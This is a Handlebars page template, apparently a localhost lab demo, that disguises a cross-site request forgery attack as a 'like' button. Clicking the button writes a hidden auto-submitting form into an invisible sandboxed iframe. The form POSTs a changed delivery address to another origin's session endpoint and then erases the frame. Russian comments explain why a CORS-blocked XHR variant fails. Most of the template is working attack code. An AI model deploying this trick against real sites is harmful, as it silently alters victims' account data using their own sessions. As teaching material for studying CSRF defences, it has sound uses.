{{#> layout }}
  {{#*inline "content"}}
    <h1>{{layout.title}}</h1>
    <div>
       Push like please <br><br> <a id="send" href=""><img src="/static/like.png" width="100px" height="100px"></img></a>
    </div>

    <script> history.pushState('','','');</script>
    <div id="box-frame" style="visibility: hidden">
      <iframe 
        id="frame" 
        src="about:blank"
        title="description" 
        sandbox="allow-same-origin allow-scripts allow-popups allow-forms">
      </iframe>      
    </div>

    <script>
        let content = "<form action='http://127.0.0.1:8080/set-session-form' method='POST' target='_self'> \
          <input type='hidden' name='delivery_address' value='My new delivery_address'/> \
          <input id='send_my_data' hidden type='submit' value='Submit request'/> \
          </form> \
          <script>function send(){console.info('Change cookie'); document.getElementById('send_my_data').click();}</"+"script>";
       
         document.getElementById('send').addEventListener('click',function(e){ 
           e.preventDefault();
           

           let el = document.getElementById("frame");
           var frame_win = getIframeWindow(el);
           frame_win.document.write(content);
           frame_win.send();
          
            setTimeout(function tick() { 
              document.getElementById("box-frame").innerHTML = "";
            }, 500); 
            
          
          
          
          // Этот вариант конечно не работает!
          // Доступ к XMLHttpRequest по адресу «http://127.0.0.1:8080/set-session-form» из источника «http://127.0.0.1:8090» 
          // заблокирован политикой CORS: ответ на предполетный запрос не передает доступ контрольная проверка: 
          // в запрошенном ресурсе отсутствует заголовок Access-Control-Allow-Origin

          async function change_address(){
            const form = new URLSearchParams();
            form.append('delivery_address', 'My new delivery_address');

            const instance = axios.create({
              withCredentials: true,
              baseURL: 'http://127.0.0.1:8080',
              ContentType: 'application/x-www-form-urlencoded' 
            });
            await instance.post('/set-session-form', form ,{
                headers: {
                  'Access-Control-Allow-Origin': 'http://127.0.0.1:8080/set-session-form', 
                  'Access-Control-Allow-Credentials': true,
                  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept'
                }
            } );  
            console.info('Change cookie');
          }  
          //change_address();

          return false;
        });
        function getIframeWindow(iframe_object) {
          var doc;

          if (iframe_object.contentWindow) {
            return iframe_object.contentWindow;
          }

          if (iframe_object.window) {
            return iframe_object.window;
          } 

          if (!doc && iframe_object.contentDocument) {
            doc = iframe_object.contentDocument;
          } 

          if (!doc && iframe_object.document) {
            doc = iframe_object.document;
          }

          if (doc && doc.defaultView) {
          return doc.defaultView;
          }

          if (doc && doc.parentWindow) {
            return doc.parentWindow;
          }

          return undefined;
        }
      </script>
  {{/inline}}
{{/layout}}